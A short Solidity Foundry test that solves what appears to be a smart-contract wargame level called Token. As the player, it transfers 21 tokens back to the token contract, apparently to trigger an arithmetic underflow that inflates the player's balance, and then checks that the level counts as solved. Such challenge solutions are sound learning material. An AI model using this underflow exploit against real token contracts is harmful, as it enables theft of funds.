pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/TokenFactory.sol';
import 'levels/Token.sol';
import 'utils/TestUtils.sol';

contract TokenTest is Test {
  address player;
  Utils utils;
  TokenFactory tokenFactory;
  address payable tokenAddress;
  Token token;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    tokenFactory = new TokenFactory();
    tokenAddress = payable(tokenFactory.createInstance(player));
    token = Token(tokenAddress);
  }

  function testHack() public {
    vm.prank(player);
    token.transfer(tokenAddress, 21);
    assertTrue(tokenFactory.validateInstance(tokenAddress, player), 'Level not solved');
  }
}
